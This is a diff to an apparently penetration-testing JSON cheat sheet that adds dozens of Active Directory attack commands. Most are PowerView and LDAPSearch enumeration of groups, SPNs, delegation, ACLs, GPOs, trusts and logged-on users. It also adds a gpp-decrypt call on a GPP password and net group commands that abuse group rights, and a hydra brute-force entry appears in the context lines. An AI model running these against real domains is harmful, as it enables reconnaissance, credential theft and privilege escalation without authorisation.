@@ -1,5 +1,5 @@
 {
-  "Version": "1.0.0.5",
+  "Version": "1.0.0.6",
   "Categories": [
     {
       "id": 0,
@@ -105,6 +105,412 @@
       "Description": "Brute force login attempts",
       "Command": "hydra -l tyler -P /usr/share/wordlists/rockyou.txt 10.10.10.98 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=valid\"",
       "OS": "Linux"
+    },
+    {
+      "Name": "LDAPSearch - Enumerate All Groups and Members",
+      "Category": 12,
+      "Description": "Uses LDAPSearch to query all groups and list their members",
+      "Command": "foreach ($group in $(LDAPSearch -LDAPQuery \"(objectCategory=group)\")) {$group.properties | select {$_.cn}, {$_.member}}",
+      "OS": "Windows"
+    },
+    {
+      "Name": "LDAPSearch - Query Specific Group (Sales Department)",
+      "Category": 12,
+      "Description": "Uses LDAPSearch to find the 'Sales Department' group",
+      "Command": "LDAPSearch -LDAPQuery \"(&(objectCategory=group)(cn=Sales Department))\"",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - List Computers with OS and Hostname",
+      "Category": 3,
+      "Description": "PowerView: Retrieve all domain computers with OS and DNS hostname",
+      "Command": "Get-NetComputer | select operatingsystem,dnshostname",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Find Local Admin Access",
+      "Category": 9,
+      "Description": "PowerView: Identify machines where current user has local admin access",
+      "Command": "Find-LocalAdminAccess",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - List Computers with OS and Version",
+      "Category": 3,
+      "Description": "PowerView: Enumerate computers with full OS version details",
+      "Command": "Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PsLoggedon - Check Logged-On Users on Remote Host",
+      "Category": 9,
+      "Description": "PsLoggedon: Show users logged into remote system via SMB",
+      "Command": ".\\PsLoggedon.exe \\\\web2point0",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerShell - Get LanmanServer ACLs",
+      "Category": 9,
+      "Description": "Retrieve ACLs for LanmanServer service registry key",
+      "Command": "Get-Acl -Path HKLM:SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity\\ | fl",
+      "OS": "Windows"
+    },
+    {
+      "Name": "GPP-Decrypt - Decrypt Group Policy Preference Password",
+      "Category": 13,
+      "Description": "Decrypt encrypted password from Group Policy Preferences XML",
+      "Command": "gpp-decrypt \"+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE\"",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Find Domain Shares",
+      "Category": 3,
+      "Description": "PowerView: Enumerate all accessible domain shares",
+      "Command": "Find-DomainShare",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Query SPNs for IIS Service",
+      "Category": 3,
+      "Description": "List service principal names registered for iis_service account",
+      "Command": "setspn -L iis_service",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Users with SPNs",
+      "Category": 3,
+      "Description": "PowerView: Retrieve users with associated service principal names",
+      "Command": "Get-NetUser -SPN | select samaccountname,serviceprincipalname",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Find GenericAll ACL on Management Department",
+      "Category": 9,
+      "Description": "PowerView: Find principals with full control over Management Department group",
+      "Command": "Get-ObjectAcl -Identity \"Management Department\" | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} | select SecurityIdentifier,ActiveDirectoryRights",
+      "OS": "Windows"
+    },
+    {
+      "Name": "Net Group - Add User to Management Department",
+      "Category": 9,
+      "Description": "Add user 'stephanie' to domain group 'Management Department'",
+      "Command": "net group \"Management Department\" stephanie /add /domain",
+      "OS": "Windows"
+    },
+    {
+      "Name": "Net Group - Remove User from Management Department",
+      "Category": 9,
+      "Description": "Remove user 'stephanie' from domain group 'Management Department'",
+      "Command": "net group \"Management Department\" stephanie /del /domain",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - List Members of Management Department",
+      "Category": 3,
+      "Description": "PowerView: Retrieve current members of Management Department group",
+      "Command": "Get-NetGroup \"Management Department\" | select member",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Current Domain SID",
+      "Category": 3,
+      "Description": "PowerView: Retrieve the SID of the current domain",
+      "Command": "Get-DomainSID",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Object from Another Domain",
+      "Category": 3,
+      "Description": "PowerView: Query domain object from specified domain",
+      "Command": "Get-Domain -Domain domain.local",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - List Domain Controllers",
+      "Category": 3,
+      "Description": "PowerView: Enumerate domain controllers in current domain",
+      "Command": "Get-DomainController",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - List DCs in Specified Domain",
+      "Category": 3,
+      "Description": "PowerView: Get domain controllers for domain.local",
+      "Command": "Get-DomainController -Domain domain.local",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Default Domain Policy",
+      "Category": 3,
+      "Description": "PowerView: Retrieve the default domain policy object",
+      "Command": "Get-DomainPolicy",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Search OUs by Name Pattern",
+      "Category": 3,
+      "Description": "PowerView: Find OUs containing 'admin' or 'server'",
+      "Command": "\"*admin*\",\"*server*\" | Get-DomainOU",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - List Computers in Specific OU",
+      "Category": 3,
+      "Description": "PowerView: Enumerate computers in tMachines OU",
+      "Command": "Get-DomainComputer -SearchBase \"LDAP://OU=tMachines,DC=domain,DC=local\"",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Filter Computers by OS (2016)",
+      "Category": 3,
+      "Description": "PowerView: List computers running Windows Server 2016",
+      "Command": "Get-DomainComputer -OperatingSystem '*2016*' -Properties name,operatingsystem",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Find MSSQL SPN Computers",
+      "Category": 3,
+      "Description": "PowerView: Locate computers with MSSQL service principal names",
+      "Command": "Get-DomainComputer -SPN '*mssql*' -Properties name",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Computers Trusted for Delegation",
+      "Category": 9,
+      "Description": "PowerView: Find computers trusted to authenticate for others",
+      "Command": "Get-DomainComputer -TrustedToAuth",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Computers with Unconstrained Delegation",
+      "Category": 9,
+      "Description": "PowerView: Identify systems with unconstrained Kerberos delegation",
+      "Command": "Get-DomainComputer -Unconstrained",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Find Admin Groups",
+      "Category": 3,
+      "Description": "PowerView: List all groups containing 'admin' in name",
+      "Command": "Get-DomainGroup -Identity '*admin*'",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Local Groups on Remote Host (API)",
+      "Category": 9,
+      "Description": "PowerView: Enumerate local groups on SQL1 using Win32 API",
+      "Command": "Get-NetLocalGroup -ComputerName SQL1",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Local Groups on Remote Host (WinNT)",
+      "Category": 9,
+      "Description": "PowerView: Enumerate local groups on SQL1 using WinNT provider",
+      "Command": "Get-NetLocalGroup -ComputerName SQL1 -Method WinNT",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Local Group Members (API)",
+      "Category": 9,
+      "Description": "PowerView: List members of default local group on DC",
+      "Command": "Get-NetLocalGroupMember -ComputerName DC",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Local Group Members (WinNT)",
+      "Category": 9,
+      "Description": "PowerView: List local group members on DC using WinNT provider",
+      "Command": "Get-NetLocalGroupMember -ComputerName DC -Method WinNT",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - GPO Applied to Student OUs",
+      "Category": 3,
+      "Description": "PowerView: Show GPOs linked to OUs containing 'student'",
+      "Command": "Get-DomainOU -Identity \"*student*\" -Properties name,gplink | Format-List",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Specific GPO by GUID",
+      "Category": 3,
+      "Description": "PowerView: Retrieve GPO by its GUID",
+      "Command": "Get-DomainGPO -SearchBase \"LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=domain,DC=local\"",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - GPOs Applied to Computer",
+      "Category": 3,
+      "Description": "PowerView: List all GPOs applied to windows1.local",
+      "Command": "Get-DomainGPO -ComputerName windows1.local",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - GPOs Applied to User",
+      "Category": 3,
+      "Description": "PowerView: Show GPOs affecting a specific user",
+      "Command": "Get-DomainGPO -UserIdentity \"user\"",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - GPOs Modifying Local Groups",
+      "Category": 9,
+      "Description": "PowerView: Find GPOs using Restricted Groups or Preferences",
+      "Command": "Get-DomainGPOLocalGroup -ResolveMembersToSIDs",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - User in Local Admin via GPO",
+      "Category": 9,
+      "Description": "PowerView: Find machines where 'user' is local admin via GPO",
+      "Command": "Get-DomainGPOUserLocalGroupMapping -Identity \"user\" -LocalGroup \"Administrators\"",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - RDP Rights via GPO",
+      "Category": 9,
+      "Description": "PowerView: Find users with RDP access to PC via GPO",
+      "Command": "Get-DomainGPOComputerLocalGroupMapping -ComputerName PC.domain.local -LocalGroup RDP",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Admin Rights via OU GPO",
+      "Category": 9,
+      "Description": "PowerView: Find admin users on servers OU via GPO",
+      "Command": "Get-DomainGPOComputerLocalGroupMapping -OUIdentity \"servers\" -LocalGroup Administrators",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Search GPOs by Name",
+      "Category": 3,
+      "Description": "PowerView: Find GPOs with 'admin' or 'server' in name",
+      "Command": "\"*admin*\",\"*server*\" | Get-DomainGPO",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - OUs Linked to Specific GPO",
+      "Category": 3,
+      "Description": "PowerView: List OUs linked to GPO by GUID",
+      "Command": "Get-DomainOU -GPLink \"3E04167E-C2B6-4A9A-8FB7-C811158DC97C\"",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Enumerate GPO ACLs",
+      "Category": 9,
+      "Description": "PowerView: Get ACLs for all Group Policy Objects",
+      "Command": "Get-DomainGPO | %{Get-DomainObjectAcl -Identity $_.displayname -ResolveGUIDs}",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Find Interesting Domain ACLs",
+      "Category": 9,
+      "Description": "PowerView: Identify modifiable objects via non-builtin SIDs",
+      "Command": "Find-InterestingDomainAcl -ResolveGUIDs | Select-Object ObjectDN,ActiveDirectoryRights,securityidentifier | Format-List",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Current Forest Object",
+      "Category": 3,
+      "Description": "PowerView: Retrieve forest root object",
+      "Command": "Get-Forest",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - List All Forest Domains",
+      "Category": 3,
+      "Description": "PowerView: Enumerate all domains in the forest",
+      "Command": "Get-ForestDomain",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Domain Trusts",
+      "Category": 3,
+      "Description": "PowerView: List domain trusts for domain.local",
+      "Command": "Get-DomainTrust -Domain domain.local",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - List Global Catalogs",
+      "Category": 3,
+      "Description": "PowerView: Find all global catalog servers in forest",
+      "Command": "Get-ForestGlobalCatalog",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Forest Trusts",
+      "Category": 3,
+      "Description": "PowerView: Enumerate forest-level trusts",
+      "Command": "Get-ForestTrust",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Logged-On Users (SMB)",
+      "Category": 9,
+      "Description": "PowerView: Show users logged into adminsrv via SMB",
+      "Command": "Get-NetLoggedon -ComputerName adminsrv -Verbose",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Active Sessions",
+      "Category": 9,
+      "Description": "PowerView: Enumerate NetSessionEnum on remote host",
+      "Command": "Get-NetSession -ComputerName APPSRV -Verbose",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Logged-On via Registry",
+      "Category": 9,
+      "Description": "PowerView: Query remote registry for logged-on users",
+      "Command": "Get-RegLoggedOn -ComputerName DC -Verbose",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get RDP Sessions",
+      "Category": 9,
+      "Description": "PowerView: List active RDP sessions and source IPs",
+      "Command": "Get-NetRDPSession -ComputerName STDADMIN -Verbose",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Get Last Logged-On User (WMI)",
+      "Category": 9,
+      "Description": "PowerView: Retrieve last interactive logon via WMI registry",
+      "Command": "Get-WMIRegLastLoggedOn -ComputerName DC -Verbose",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Test Admin Access",
+      "Category": 9,
+      "Description": "PowerView: Check if current user has admin on remote host",
+      "Command": "Test-AdminAccess -Verbose",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Find Local Admin Access (Domain)",
+      "Category": 9,
+      "Description": "PowerView: Locate domain machines with current user as local admin",
+      "Command": "Find-LocalAdminAccess -Verbose",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Find Domain Local Group Members",
+      "Category": 9,
+      "Description": "PowerView: Enumerate members of local groups across domain",
+      "Command": "Find-DomainLocalGroupMember -Verbose",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Locate User Sessions (Standard)",
+      "Category": 9,
+      "Description": "PowerView: Find where domain users are currently logged in",
+      "Command": "Find-DomainUserLocation -Verbose",
+      "OS": "Windows"
+    },
+    {
+      "Name": "PowerView - Locate User Sessions (Stealth)",
+      "Category": 9,
+      "Description": "PowerView: Stealth user location tracking across domain",
+      "Command": "Find-DomainUserLocation -Stealth -Verbose",
+      "OS": "Windows"
     },
     {
       "Name": "Brute SSH Login",
